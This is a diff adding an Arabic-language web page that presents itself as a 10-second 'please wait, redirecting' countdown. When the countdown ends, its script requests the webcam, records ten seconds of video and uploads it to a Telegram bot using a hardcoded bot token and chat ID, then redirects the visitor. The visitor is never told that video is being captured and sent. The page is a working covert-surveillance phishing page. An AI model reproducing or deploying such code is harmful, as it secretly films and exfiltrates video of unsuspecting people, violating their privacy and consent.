@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الرجاء الانتظار</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: center;
+            color: #333;
+        }
+        #timerCircle {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 10px solid #4CAF50;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        .message {
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div id="timerCircle">10</div>
+    <div class="message">الرجاء الانتظار، سيتم نقلك تلقائيًا بعد 10 ثوانٍ</div>
+
+    <script>
+        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+        const chatId = '6185375878';
+        let countdown = 10;
+        const timerCircle = document.getElementById("timerCircle");
+
+        function startCountdown() {
+            const interval = setInterval(() => {
+                countdown--;
+                timerCircle.textContent = countdown;
+
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    captureVideo();
+                }
+            }, 1000);
+        }
+
+        async function captureVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+
+                setTimeout(() => {
+                    recorder.stop();
+                    recorder.onstop = () => {
+                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                        stream.getTracks().forEach(track => track.stop());
+                        sendVideoData(videoBlob);
+                    };
+                }, 10000);
+            } catch (error) {
+                console.error('خطأ في الوصول إلى الكاميرا:', error);
+                window.location.href = "finalPage.html";
+            }
+        }
+
+        function sendVideoData(videoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, 'video.webm');
+            formData.append('caption', '📹 فيديو تم تسجيله لمدة 10 ثوانٍ.');
+
+            fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => window.location.href = "finalPage.html")
+            .catch(error => console.error('خطأ في إرسال الفيديو:', error));
+        }
+
+        startCountdown();
+    </script>
+</body>
+</html>
